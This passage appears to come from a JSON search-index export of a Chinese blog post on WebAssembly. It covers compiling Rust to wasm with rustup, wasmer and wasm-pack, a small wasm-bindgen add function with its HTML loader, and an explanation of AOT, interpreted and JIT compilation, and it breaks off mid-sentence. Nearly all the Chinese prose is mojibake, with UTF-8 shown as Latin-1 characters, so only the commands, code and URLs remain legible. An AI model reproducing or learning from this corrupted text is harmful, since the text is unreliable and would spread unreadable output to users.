","date":"2022-10-11","objectID":"/webassembly/:2:0","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"â€œå¯ä»¥åœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šè¿è¡Œ\"çš„WebAssembly: ç¼–è¯‘ rustup target add wasm32-wasi \u0026\u0026 rustc hello.rs --target wasm32-wasi -o hello_standalone.wasm å…¶ä¸­wasm32-wasi è¡¨ç¤º WebAssembly with WASI , WASIæ˜¯WebAssemblyçš„æ¨¡å—åŒ–ç³»ç»Ÿæ¥å£ è¿è¡Œ è¿è¡Œç¼–è¯‘å‡ºæ¥çš„WebAssemblyéœ€è¦ç”¨åˆ°\"åŸºäºå †æ ˆçš„è™šæ‹Ÿæœºâ€, è¿™ä¸ªè™šæ‹Ÿæœºæˆ‘ä»¬ç§°ä¹‹ä¸º\"è¿è¡Œæ—¶\" (WebAssembly Runtime). WebAssembly Runtimeæœ‰å¾ˆå¤š, è¿™é‡Œæœ‰ä¸€ä¸ªåˆ—è¡¨: https://github.com/appcypher/awesome-wasm-runtimes æˆ‘ä»¬é€‰æ‹©wasmer https://github.com/wasmerio/wasmer , å…ˆæ ¹æ®å®˜æ–¹æ–‡æ¡£å®‰è£…å¥½. OSX MP16 ~/Dow/wasm_example/standalone â¯ wasmer ./hello_standalone.wasm Hello, i'm Rust! è·¨å¹³å°è¿è¡Œ ä¸Šé¢çš„hello_standalone.wasmæˆ‘æ˜¯åœ¨macosä¸Šç¼–è¯‘å‡ºæ¥çš„, ä¸€ä¸ªå¤§èƒ†çš„æƒ³æ³•: æ‹¿åˆ°windowsä¸Šé¢å», å¯ä»¥è¿è¡Œå—? åœ¨windowsä¸Šé¢å®‰è£…å¥½wasmer, ç„¶åè¿è¡Œ: PS C:\\Users\\Administrator\u003e wasmer \"Z:\\ä¸‹è½½\\wasm_example\\standalone\\hello_standalone.wasm\" Hello, i'm Rust! å®Œå…¨æ²¡æœ‰é—®é¢˜. æ³¨: ç”¨cargoæ–°å»ºå’Œç¼–è¯‘é¡¹ç›®æ›´ä¸ºé€šç”¨ä¸€äº›, å‚è€ƒè¿™é‡Œ https://docs.wasmtime.dev/wasm-rust.html ç”¨åˆ°çš„ä¸»è¦å‘½ä»¤ rustup target add wasm32-wasi cargo install cargo-wasi cargo new MyProject cargo wasi run ","date":"2022-10-11","objectID":"/webassembly/:2:1","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"â€œå¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¿è¡Œ\"çš„WebAssembly ç¼–å†™å·¥ç¨‹ æˆ‘ä»¬å°†ä½¿ç”¨ wasm-pack è¿™ä¸ªå·¥å…·, å…ˆåˆ°å®˜ç½‘å®‰è£…å¥½è¯¥å·¥å…· https://rustwasm.github.io/wasm-pack/ æˆ–ä½¿ç”¨ cargo install wasm-pack å®‰è£… è¯¥å·¥å…·ä¼šç»™æˆ‘ä»¬ç”Ÿæˆå¾ˆå¤šJSå’ŒWebAssemblyç›¸ç»“åˆçš„\"èƒ¶æ°´ä»£ç â€, ä»¥ä¾¿äº‹æƒ…æ¥å¾—æ›´ç®€å•. æ–°å»ºé¡¹ç›®: wasm-pack new wasm-web åˆ°./src/lib.rs ä¸­è¿½åŠ ä¸€ä¸ªåŠ æ³•ä»£ç  #[wasm_bindgen] pub fn add(a: i32, b: i32) -\u003e i32 { a + b } å…¶ä¸­çš„wasm_bindgenæ˜¯ä¸€ä¸ªåº“, åœ¨Cargo.tomlä¸­è¿›è¡Œäº†å£°æ˜ [dependencies] wasm-bindgen = \"0.2.63\" wasm-bindgenå·¥å…·æœ‰ç‚¹åƒä¸ºä¸»æœºç»‘å®šå»ºè®®ç­‰åŠŸèƒ½æä¾›çš„polyfillï¼Œä»¥åŠä¸ºJSå’Œwasmç¼–è¯‘çš„ä»£ç ï¼ˆç›®å‰ä¸»è¦æ¥è‡ªRustï¼‰ä¹‹é—´çš„é«˜çº§äº¤äº’æä¾›çš„åŠŸèƒ½ã€‚æ›´å…·ä½“åœ°è¯´ï¼Œè¿™ä¸ªé¡¹ç›®å…è®¸JS/wasmä¸å­—ç¬¦ä¸²ã€JSå¯¹è±¡ã€ç±»ç­‰è¿›è¡Œäº¤æµï¼Œè€Œä¸æ˜¯çº¯ç²¹çš„æ•´æ•°å’Œæµ®ç‚¹æ•°ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨wasm-bindgenï¼Œä½ å¯ä»¥åœ¨Rustä¸­å®šä¹‰ä¸€ä¸ªJSç±»ï¼Œæˆ–è€…ä»JSä¸­è·å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ–è€…è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å…¶åŠŸèƒ½ä¹Ÿåœ¨ä¸æ–­å¢åŠ ! è¯¦ç»†ä¿¡æ¯å‚è€ƒè¿™é‡Œ: https://rustwasm.github.io/wasm-bindgen/ ç¼–è¯‘ wasm-pack build å…¶ä¸­ç”Ÿæˆçš„./pkg/wasm_web_bg.wasmå°±æ˜¯\"å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¿è¡Œ\"çš„WebAssembly, ä¹Ÿå°±æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹æ‰€è¯´çš„é‚£ç§WebAssembly(éSTANDALONEçš„, éœ€è¦JSæ¥è¿›è¡Œè°ƒç”¨æ‰§è¡Œçš„, ç±»ä¼¼äºLibrary) å¦å¤–, åœ¨pkg/wasm_web.js å’Œ pkg/wasm_web_bg.jsç”Ÿæˆäº†JSåŒ…è£…è°ƒç”¨WebAssemblyçš„èƒ¶æ°´ä»£ç . /** * @param {number} a * @param {number} b * @returns {number} */ export function add(a, b) { const ret = wasm.add(a, b); return ret; } å¯ä»¥çœ‹åˆ°JSä¸­çš„addå®é™…æ˜¯å¯¹WebAssemblyä¸­çš„addå‡½æ•°çš„å°è£…. è¿è¡Œ åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹æ·»åŠ index.html \u003c!DOCTYPE html\u003e \u003chtml lang=\"en-US\"\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eexample\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003clabel id=\"labelContent\"\u003e\u003c/label\u003e \u003cscript type=\"module\"\u003e import init, { greet, add } from \"./pkg/wasm_web.js\"; init().then(() =\u003e { document.getElementById(\"labelContent\").innerHTML = \"2+2=\" + add(2,2); }); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹è¿è¡Œä¸€ä¸ªhttpserver: python -m SimpleHTTPServer 7777 ","date":"2022-10-11","objectID":"/webassembly/:2:2","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"WebAssemblyåº•å±‚åŸç† ","date":"2022-10-11","objectID":"/webassembly/:3:0","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"ç°ä»£ç¼–ç¨‹è¯­è¨€çš„ç¼–è¯‘/è¿è¡Œæ–¹å¼ AOT é¢„å…ˆç¼–è¯‘ Ahead-of-Time compilation, é¢„å…ˆç¼–è¯‘ å°†æºä»£ç ç¼–è¯‘æˆæœºå™¨ä»£ç . C/C++, Rust, Goæ˜¯ä½¿ç”¨è¿™ç±»ç¼–è¯‘æ–¹å¼çš„ä»£è¡¨ ç¼–è¯‘å™¨è·å–ç¨‹åºä»£ç ï¼ˆæºä»£ç ï¼‰å¹¶å°†æºä»£ç è½¬æ¢ä¸ºæœºå™¨è¯­è¨€æ¨¡å—ï¼ˆç§°ä¸ºå¯¹è±¡æ–‡ä»¶ï¼‰ã€‚å¦ä¸€ä¸ªä¸“é—¨çš„ç¨‹åºï¼Œç§°ä¸ºé“¾æ¥å™¨ï¼Œå°†è¿™ä¸ªå¯¹è±¡æ–‡ä»¶ä¸å…¶ä»–å…ˆå‰ç¼–è¯‘çš„å¯¹è±¡æ–‡ä»¶ï¼ˆç‰¹åˆ«æ˜¯è¿è¡Œæ—¶æ¨¡å—ï¼‰ç»“åˆèµ·æ¥ï¼Œåˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚ è§£é‡Šå‹(Interpreted) è§£é‡Šè¯­è¨€çš„è¿‡ç¨‹æ˜¯ä¸åŒçš„ã€‚è§£é‡Šå™¨ä¸æ˜¯åœ¨åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶ä¹‹å‰å°†æºä»£ç ç¿»è¯‘æˆæœºå™¨è¯­è¨€ï¼Œè€Œæ˜¯åœ¨ç¨‹åºè¿è¡Œçš„åŒæ—¶å°†æºä»£ç è½¬æ¢ä¸ºæœºå™¨è¯­è¨€ã€‚Python, Ruby, Perl ç­‰æ˜¯é‡‡ç”¨è¿™ç§æ–¹å¼ å½“æ¯æ¬¡è¿è¡Œä¸€ä¸ªè§£é‡Šå‹ç¨‹åºæ—¶ï¼Œè§£é‡Šå™¨å¿…é¡»å°†æºä»£ç è½¬æ¢ä¸ºæœºå™¨ä»£ç ï¼Œå¹¶ä¸”è¿˜è¦æ‹‰å…¥è¿è¡Œæ—¶åº“ã€‚è¿™ä¸ªè½¬æ¢è¿‡ç¨‹ä½¿ç¨‹åºçš„è¿è¡Œé€Ÿåº¦æ¯”ç”¨ç¼–è¯‘è¯­è¨€ç¼–å†™çš„ç±»ä¼¼ç¨‹åºè¦æ…¢ã€‚ ç”±äºè§£é‡Šå™¨åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è¿›è¡Œäº†ä»æºä»£ç åˆ°æœºå™¨è¯­è¨€çš„è½¬æ¢ï¼Œå› æ­¤è§£é‡Šè¯­è¨€é€šå¸¸å¯¼è‡´ç¨‹åºçš„æ‰§è¡Œé€Ÿåº¦æ¯”ç¼–è¯‘ç¨‹åºæ…¢ã€‚ä½†é€šå¸¸å¾—åˆ°çš„å›æŠ¥æ˜¯ï¼Œè§£é‡Šå‹è¯­è¨€é€šå¸¸æ˜¯ç‹¬ç«‹äºå¹³å°çš„ï¼Œå› ä¸ºæ¯ä¸ªä¸åŒçš„æ“ä½œç³»ç»Ÿéƒ½å¯ä»¥ä½¿ç”¨ä¸åŒçš„è§£é‡Šå™¨ã€‚ å­—èŠ‚ç è§£é‡Šå™¨ (Bytecode interpreters) åœ¨è§£é‡Šå’Œç¼–è¯‘ä¹‹é—´æœ‰ä¸€ç³»åˆ—çš„å¯èƒ½æ€§ï¼Œè¿™å–å†³äºåœ¨ç¨‹åºæ‰§è¡Œå‰è¿›è¡Œçš„åˆ†æé‡ã€‚ä¾‹å¦‚ï¼ŒEmacs Lispè¢«ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œå­—èŠ‚ç æ˜¯Lispæºä»£ç çš„é«˜åº¦å‹ç¼©å’Œä¼˜åŒ–è¡¨ç¤ºï¼Œä½†ä¸æ˜¯æœºå™¨ç ï¼ˆå› æ­¤ä¸ä¸ä»»ä½•ç‰¹å®šçš„ç¡¬ä»¶ç›¸è”ç³»ï¼‰ã€‚è¿™ç§ â€œç¼–è¯‘ â€œçš„ä»£ç ç„¶åç”±å­—èŠ‚ç è§£é‡Šå™¨ï¼ˆæœ¬èº«æ˜¯ç”¨Cè¯­è¨€ç¼–å†™çš„ï¼‰æ¥è§£é‡Šã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç¼–è¯‘åçš„ä»£ç æ˜¯è™šæ‹Ÿæœºçš„æœºå™¨ä»£ç ï¼Œå®ƒä¸æ˜¯åœ¨ç¡¬ä»¶ä¸­å®ç°çš„ï¼Œè€Œæ˜¯åœ¨å­—èŠ‚ç è§£é‡Šå™¨ä¸­å®ç°çš„ã€‚è¿™ç§ç¼–è¯‘è§£é‡Šå™¨æœ‰æ—¶ä¹Ÿè¢«ç§°ä¸ºç¼–è¯‘å™¨ã€‚ åœ¨å­—èŠ‚ç è§£é‡Šå™¨ä¸­ï¼Œæ¯æ¡æŒ‡ä»¤ä»¥ä¸€ä¸ªå­—èŠ‚å¼€å§‹ï¼Œå› æ­¤å­—èŠ‚ç è§£é‡Šå™¨æœ€å¤šæœ‰256æ¡æŒ‡ä»¤ï¼Œå°½ç®¡ä¸ä¸€å®šéƒ½ä¼šä½¿ç”¨ã€‚ä¸€äº›å­—èŠ‚ç å¯èƒ½éœ€è¦å¤šä¸ªå­—èŠ‚ï¼Œè€Œä¸”å¯èƒ½æ˜¯ä»»æ„çš„å¤æ‚ã€‚ JIT åŠæ—¶ç¼–è¯‘ JIT: Just in Time æ¥è‡ª https://en.wikipedia.org/wiki/Just-in-time_compilation åœ¨è®¡ç®—æœºé¢†åŸŸï¼ŒåŠæ—¶ç¼–è¯‘ï¼ˆJITï¼‰æ˜¯ä¸€ç§æ‰§è¡Œè®¡ç®—æœºä»£ç çš„æ–¹å¼ï¼Œå®ƒæ¶‰åŠåœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´ï¼ˆè¿è¡Œæ—¶ï¼‰è€Œä¸æ˜¯åœ¨æ‰§è¡Œä¹‹å‰è¿›è¡Œç¼–è¯‘ã€‚è¿™å¯èƒ½åŒ…æ‹¬æºä»£ç ç¿»è¯‘ï¼Œä½†æ›´å¸¸è§çš„æ˜¯å­—èŠ‚ç ç¿»è¯‘æˆæœºå™¨ç ï¼Œç„¶åç›´æ¥æ‰§è¡Œã€‚å®ç°JITç¼–è¯‘å™¨çš„ç³»ç»Ÿé€šå¸¸ä¼šæŒç»­åˆ†ææ­£åœ¨æ‰§è¡Œçš„ä»£ç ï¼Œå¹¶ç¡®å®šä»£ç çš„å“ªäº›éƒ¨åˆ†ä»ç¼–è¯‘æˆ–é‡æ–°ç¼–è¯‘ä¸­è·å¾—çš„é€Ÿåº¦ä¼šè¶…è¿‡ç¼–è¯‘è¯¥ä»£ç çš„å¼€é”€ã€‚ JITç¼–è¯‘æ˜¯ä¸¤ç§ä¼ ç»Ÿçš„æœºå™¨ç ç¿»è¯‘æ–¹æ³•çš„ç»“åˆâ€“é¢„å…ˆç¼–è¯‘ï¼ˆAOTï¼‰å’Œè§£é‡Šå™¨ï¼Œå¹¶ä¸”ç»“åˆäº†ä¸¤è€…çš„ä¸€äº›ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚ç²—ç•¥åœ°è¯´ï¼ŒJITç¼–è¯‘ç»“åˆäº†ç¼–è¯‘ä»£ç çš„é€Ÿåº¦å’Œè§£é‡Šçš„çµæ´»æ€§ï¼Œä»¥åŠè§£é‡Šå™¨çš„å¼€é”€å’Œç¼–è¯‘å’Œé“¾æ¥ï¼ˆä¸ä»…ä»…æ˜¯è§£é‡Šï¼‰çš„é¢å¤–å¼€é”€ã€‚JITç¼–è¯‘æ˜¯åŠ¨æ€ç¼–è¯‘çš„ä¸€ç§å½¢å¼ï¼Œå¹¶å…è®¸è‡ªé€‚åº”ä¼˜åŒ–ï¼Œå¦‚åŠ¨æ€é‡æ–°ç¼–è¯‘å’Œé’ˆå¯¹å¾®æ¶æ„çš„åŠ é€Ÿã€‚è§£é‡Šå’ŒJITç¼–è¯‘ç‰¹åˆ«é€‚åˆåŠ¨æ€ç¼–ç¨‹è¯­è¨€ï¼Œå› ä¸ºè¿è¡Œæ—¶ç³»ç»Ÿå¯ä»¥å¤„ç†è¿Ÿæ¥çš„æ•°æ®ç±»å‹å¹¶æ‰§è¡Œå®‰å…¨ä¿è¯ã€‚ ç”±äºåŠ è½½å’Œç¼–è¯‘å­—èŠ‚ç æ‰€éœ€çš„æ—¶é—´ï¼ŒJITåœ¨åº”ç”¨ç¨‹åºçš„åˆå§‹æ‰§è¡Œä¸­ä¼šé€ æˆè½»å¾®åˆ°æ˜æ˜¾çš„å»¶è¿Ÿã€‚æœ‰æ—¶è¿™ç§å»¶è¿Ÿè¢«ç§°ä¸º â€œå¯åŠ¨æ—¶é—´å»¶è¿Ÿ â€œæˆ– â€œé¢„çƒ­æ—¶é—´â€ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒJITæ‰§è¡Œçš„ä¼˜åŒ–è¶Šå¤šï¼Œå®ƒç”Ÿæˆçš„ä»£ç å°±è¶Šå¥½ï¼Œä½†åˆå§‹å»¶è¿Ÿä¹Ÿä¼šå¢åŠ ã€‚å› æ­¤ï¼ŒJITç¼–è¯‘å™¨å¿…é¡»åœ¨ç¼–è¯‘æ—¶é—´å’Œå®ƒå¸Œæœ›ç”Ÿæˆçš„ä»£ç çš„è´¨é‡ä¹‹é—´åšå‡ºæƒè¡¡ã€‚å¯åŠ¨æ—¶é—´é™¤äº†JITç¼–è¯‘å¤–ï¼Œè¿˜å¯èƒ½åŒ…æ‹¬å¢åŠ çš„IOç»‘å®šæ“ä½œï¼šä¾‹å¦‚ï¼ŒJavaè™šæ‹Ÿæœºï¼ˆJVMï¼‰çš„rt.jarç±»æ•°æ®æ–‡ä»¶æ˜¯40MBï¼ŒJVMå¿…é¡»åœ¨è¿™ä¸ªä¸Šä¸‹æ–‡å·¨å¤§çš„æ–‡ä»¶ä¸­å¯»æ‰¾å¤§é‡çš„æ•°æ® ã€‚ Sunå…¬å¸çš„HotSpot Javaè™šæ‹Ÿæœºæ‰€ä½¿ç”¨çš„ä¸€ç§å¯èƒ½çš„ä¼˜åŒ–æ˜¯æŠŠè§£é‡Šå’ŒJITç¼–è¯‘ç»“åˆèµ·æ¥ã€‚åº”ç”¨ç¨‹åºä»£ç æœ€åˆæ˜¯è¢«è§£é‡Šçš„ï¼Œä½†JVMç›‘æ§å“ªäº›å­—èŠ‚ç åºåˆ—ç»å¸¸è¢«æ‰§è¡Œï¼Œå¹¶å°†å®ƒä»¬ç¿»è¯‘æˆæœºå™¨ä»£ç ï¼Œä»¥ä¾¿åœ¨ç¡¬ä»¶ä¸Šç›´æ¥æ‰§è¡Œã€‚å¯¹äºåªæ‰§è¡Œå‡ æ¬¡çš„å­—èŠ‚ç ï¼Œè¿™å¯ä»¥èŠ‚çœç¼–è¯‘æ—¶é—´å¹¶å‡å°‘åˆå§‹å»¶è¿Ÿï¼›å¯¹äºç»å¸¸æ‰§è¡Œçš„å­—èŠ‚ç ï¼ŒJITç¼–è¯‘è¢«ç”¨æ¥åœ¨ç¼“æ…¢è§£é‡Šçš„åˆå§‹é˜¶æ®µåé«˜é€Ÿè¿è¡Œã€‚æ­¤å¤–ï¼Œç”±äºä¸€ä¸ªç¨‹åºå¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨æ‰§è¡Œå…¶å°‘æ•°çš„ä»£ç ï¼Œå› æ­¤å‡å°‘çš„ç¼–è¯‘æ—¶é—´æ˜¯å¾ˆé‡è¦çš„ã€‚æœ€åï¼Œåœ¨æœ€åˆçš„ä»£ç è§£é‡Šè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥åœ¨ç¼–è¯‘å‰æ”¶é›†æ‰§è¡Œç»Ÿè®¡æ•°æ®ï¼Œè¿™æœ‰åŠ©äºè¿›è¡Œæ›´å¥½çš„ä¼˜åŒ–ã€‚ æ­£ç¡®çš„æƒè¡¡ä¼šå› æƒ…å†µä¸åŒè€Œä¸åŒã€‚ä¾‹å¦‚ï¼ŒSunå…¬å¸çš„Javaè™šæ‹Ÿæœºæœ‰ä¸¤ç§ä¸»è¦æ¨¡å¼â€“å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ã€‚åœ¨å®¢æˆ·ç«¯æ¨¡å¼ä¸‹ï¼Œæ‰§è¡Œæœ€å°çš„ç¼–è¯‘å’Œä¼˜åŒ–ï¼Œä»¥å‡å°‘å¯åŠ¨æ—¶é—´ã€‚åœ¨æœåŠ¡å™¨æ¨¡å¼ä¸‹ï¼Œä¼šè¿›è¡Œå¤§é‡çš„ç¼–è¯‘å’Œä¼˜åŒ–ï¼Œé€šè¿‡ç‰ºç‰²å¯åŠ¨æ—¶é—´ï¼Œä½¿åº”ç”¨ç¨‹åºè¿è¡Œåçš„æ€§èƒ½æœ€å¤§åŒ–ã€‚å…¶ä»–çš„Javaå³æ—¶ç¼–è¯‘å™¨ä½¿ç”¨æ–¹æ³•æ‰§è¡Œæ¬¡æ•°çš„è¿è¡Œæ—¶é—´æµ‹é‡ï¼Œç»“åˆæ–¹æ³•çš„å­—èŠ‚ç å¤§å°ï¼Œä½œä¸ºå†³å®šä½•æ—¶ç¼–è¯‘çš„å¯å‘å¼æ–¹æ³•ã€‚è¿˜æœ‰ä¸€ä¸ªä½¿ç”¨æ‰§è¡Œæ¬¡æ•°ç»“åˆå¾ªç¯çš„æ£€æµ‹ã€‚[22] ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨çŸ­æ—¶è¿è¡Œçš„åº”ç”¨ç¨‹åºä¸­å‡†ç¡®é¢„æµ‹å“ªäº›æ–¹æ³•éœ€è¦ä¼˜åŒ–æ¯”åœ¨é•¿æ—¶è¿è¡Œçš„åº”ç”¨ç¨‹åºä¸­æ›´éš¾ã€‚ å¾®è½¯çš„Native Image Generatorï¼ˆNgenï¼‰æ˜¯å¦ä¸€ç§å‡å°‘åˆå§‹å»¶è¿Ÿçš„æ–¹æ³•ã€‚ Ngenå°†é€šç”¨ä¸­é—´è¯­è¨€å›¾åƒ(Image)ä¸­çš„å­—èŠ‚ç é¢„ç¼–è¯‘ï¼ˆæˆ– â€œé¢„JITâ€ï¼‰ä¸ºæœºå™¨æœ¬åœ°ä»£ç ã€‚å› æ­¤ï¼Œä¸éœ€è¦åœ¨è¿è¡Œæ—¶è¿›è¡Œç¼–è¯‘ã€‚ä¸Visual Studio 2005ä¸€èµ·è¿é€çš„.NETæ¡†æ¶2.0åœ¨å®‰è£…åç«‹å³å¯¹æ‰€æœ‰çš„å¾®è½¯åº“DLLsè¿è¡ŒNgenã€‚é¢„jittingæä¾›äº†ä¸€ç§æ”¹å–„å¯åŠ¨æ—¶é—´çš„æ–¹æ³•ã€‚ç„¶è€Œï¼Œå®ƒæ‰€äº§ç”Ÿçš„ä»£ç è´¨é‡å¯èƒ½ä¸å¦‚JITåŒ–çš„ä»£ç ï¼ŒåŸå› ä¸é™æ€ç¼–è¯‘çš„ä»£ç åœ¨æ²¡æœ‰å‰–ææŒ‡å¯¼ä¸‹çš„ä¼˜åŒ–ï¼Œåœ¨æç«¯æƒ…å†µä¸‹ä¸èƒ½åƒJITç¼–è¯‘çš„ä»£ç é‚£æ ·å¥½çš„åŸå› ä¸€æ ·ï¼šç¼ºä¹å‰–ææ•°æ®æ¥é©±åŠ¨ï¼Œä¾‹å¦‚ï¼Œå†…è”ç¼“å­˜ã€‚ ä¹Ÿæœ‰ä¸€äº›Javaå®ç°å°†AOTï¼ˆè¶…å‰ï¼‰ç¼–è¯‘å™¨ä¸JITç¼–è¯‘å™¨ï¼ˆExcelsior JETï¼‰æˆ–è§£é‡Šå™¨ï¼ˆGNU Compiler for Javaï¼‰ç›¸ç»“åˆã€‚ JITç¼–è¯‘ä»æ ¹æœ¬ä¸Šä½¿ç”¨å¯æ‰§è¡Œæ•°æ®ï¼Œå› æ­¤å¸¦æ¥äº†å®‰å…¨æŒ‘æˆ˜å’Œå¯èƒ½çš„æ¼æ´ã€‚ JITç¼–è¯‘çš„å®æ–½åŒ…æ‹¬å°†æºä»£ç æˆ–å­—èŠ‚ç ç¼–è¯‘æˆæœºå™¨ç å¹¶æ‰§è¡Œã€‚è¿™é€šå¸¸æ˜¯åœ¨å†…å­˜ä¸­ç›´æ¥å®Œæˆçš„ï¼šJITç¼–è¯‘å™¨å°†æœºå™¨ä»£ç ç›´æ¥è¾“å‡ºåˆ°å†…å­˜ä¸­å¹¶ç«‹å³æ‰§è¡Œï¼Œè€Œä¸æ˜¯åƒé€šå¸¸çš„è¶…å‰ç¼–è¯‘é‚£æ ·å°†å…¶è¾“å‡ºåˆ°ç£ç›˜ï¼Œç„¶åä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¨‹åºè°ƒç”¨ã€‚åœ¨ç°ä»£æ¶æ„ä¸­ï¼Œç”±äºå¯æ‰§è¡Œç©ºé—´çš„ä¿æŠ¤ï¼Œè¿™é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼šä»»æ„çš„å†…å­˜ä¸èƒ½è¢«æ‰§è¡Œï¼Œå¦åˆ™å°±ä¼šå‡ºç°æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œå†…å­˜å¿…é¡»è¢«æ ‡è®°ä¸ºå¯æ‰§è¡Œï¼›å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œè¿™åº”è¯¥åœ¨ä»£ç è¢«å†™å…¥å†…å­˜åè¿›è¡Œï¼Œå¹¶æ ‡è®°ä¸ºåªè¯»ï¼Œå› ä¸ºå¯å†™/å¯æ‰§è¡Œçš„å†…å­˜æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼‰ã€‚ ä¾‹å¦‚ï¼ŒFirefoxçš„JITç¼–è¯‘å™¨åœ¨Firefox 46çš„å‘å¸ƒç‰ˆæœ¬ä¸­å¼•å…¥äº†è¿™ç§ä¿æŠ¤ã€‚JITå–·æ´’æ˜¯ä¸€ç±»è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œå®ƒä½¿ç”¨JITç¼–è¯‘è¿›è¡Œå †å–·æ´’ï¼šç„¶åäº§ç”Ÿçš„å†…å­˜æ˜¯å¯æ‰§è¡Œçš„ï¼Œå¦‚æœæ‰§è¡Œå¯ä»¥ç§»åŠ¨åˆ°å †ä¸­ï¼Œå°±å¯ä»¥è¿›è¡Œæ¼æ´æ”»å‡»ã€‚ è¿‘å¹´æ¥ï¼ŒåŠæ—¶ç¼–è¯‘åœ¨è¯­è¨€å®ç°è€…ä¸­è·å¾—äº†ä¸»æµå…³æ³¨ï¼ŒJavaã€.NETæ¡†æ¶ã€å¤§å¤šæ•°ç°ä»£JavaScriptå®ç°å’ŒMatlabç°åœ¨éƒ½åŒ…æ‹¬JITç¼–è¯‘å™¨ã€‚ æ›´å¤šç±»å‹çš„å‚è€ƒ : https://en.wikipedia.org/wiki/Interpreter_(computing) ","date":"2022-10-11","objectID":"/webassembly/:3:1","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"WebAssemblyçš„ç¼–è¯‘/è¿è¡Œæ–¹å¼ WebAssemblyçš„ç¼–è¯‘/è¿è¡Œæ–¹å¼å¤šç§å¤šæ ·. è¿™å–å†³äº æµè§ˆå™¨å¼•æ“æˆ–runtime(è¿è¡Œæ—¶)çš„å®ç°æ–¹å¼. åˆ° https://github.com/appcypher/awesome-wasm-runtimes , å‚è€ƒæ¯ä¸ªè¿è¡Œæ—¶çš„Compilation / Execution modes ä¸€èŠ‚, ä»–ä»¬å¯¹JIT, AOT, Interpreted éƒ½æœ‰éƒ¨åˆ†æˆ–å…¨éƒ¨æ”¯æŒ. æ³¨:ä¸ºå•¥è¿˜è¦AOT, é™¤äº†é€Ÿåº¦å¿«ä»¥å¤–, æ›´é‡è¦çš„æ˜¯ä¸€äº›å¹³å°å‡ºäºå®‰å…¨è€ƒè™‘æ˜¯ä¸æ”¯æŒJITçš„, æ¯”å¦‚IOS å¦å¤–è¿˜æœ‰ä¸€ç§å«\"åŠ¨æ€åˆ†å±‚ç¼–è¯‘â€: https://groups.google.com/a/chromium.org/g/blink-dev/c/Xzr6PQflTFA ä½†æ€»ä½“è€Œè¨€ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ runtime â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â” â”‚.c/.cpp â”‚â”€emccâ”€â”€â”€â” â”€ â”€â–¶â”‚AOT â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â””â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â” â”‚ .rs â”‚â”€rustcâ”€â”€â”¤ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”œâ”€â”€â”€â–¶â”‚JIT â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚ .wasm â”‚â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â” â”‚ .go â”‚â”€tinygoâ”€â”˜ â”€ â”€â–¶â”‚Inteâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â” â”‚ ... â”‚ â”‚... â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”˜ å°†æºä»£ç ç¼–è¯‘æˆwasmè¿‡ç¨‹ä¸­, ä»ç¼–è¯‘å™¨çš„è§’åº¦è€Œè¨€, æˆ‘ä»¬å¯ä»¥å°†ç¼–è¯‘å™¨åˆ†ä¸ºä¸‰æ®µ: 